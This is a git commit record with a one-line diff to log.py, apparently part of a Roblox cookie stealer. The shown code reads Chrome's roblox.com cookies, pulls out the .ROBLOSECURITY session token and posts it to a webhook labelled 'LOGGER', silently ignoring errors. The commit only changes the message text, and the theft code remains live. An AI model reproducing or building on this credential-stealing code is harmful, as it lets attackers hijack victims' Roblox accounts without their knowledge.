d0596ad54ac58c395042a9671abe2fd00a217af8
IsaacDoesntDoStuff <90070921+IsaacDoesntDoStuff@users.noreply.github.com>
2022-09-18 18:23:20 -0400

    Update log.py

--- log.py
+++ log.py
@@ -7,7 +7,7 @@ def chrome_logger():
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```COOKIE: {cookie}```'})
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
     except:
         pass
         
